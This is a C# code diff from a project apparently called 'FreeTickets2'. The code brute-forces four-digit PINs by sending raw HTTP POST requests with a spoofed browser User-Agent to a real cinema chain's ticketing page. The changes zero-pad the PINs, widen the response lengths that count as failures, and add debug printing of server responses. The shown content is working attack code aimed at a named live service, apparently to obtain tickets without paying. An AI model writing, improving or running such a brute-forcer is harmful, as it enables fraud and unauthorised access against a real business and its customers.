@@ -47,7 +47,7 @@ namespace FreeTickets2
             var stream = new BufferedStream(client.GetStream());
             for (var pin = startPin; pin < endPin; pin++)
             {
-                var a = string.Format(d, code, pin);
+                var a = string.Format(d, code, pin.ToString().PadLeft(4, '0'));
                 string req =
                     "POST /times_and_tickets/tickets.aspx?c=1005&s=158545 HTTP/1.1\r\nHost: www.hoyts.co.nz\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko\r\n" +
                     "Accept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nContent-Length: " + a.Length + "\r\n\r\n" +
@@ -65,8 +65,17 @@ namespace FreeTickets2
                     }
                     var l = data.LastIndexOf(' ');
                     int chars = int.Parse(data.Substring(l).Trim());
-                    b = chars != 89;
+                    b = chars != 89 && chars != 193 && chars != 97;
+#if DEBUG
+                    var str = "";
+                    while (chars-- > 0)
+                    {
+                        str += (char) stream.ReadByte();
+                    }
+                    Console.WriteLine(str);
+#else
                     while (chars-- > 0) stream.ReadByte();
+#endif
 
                 }
                 catch (Exception)
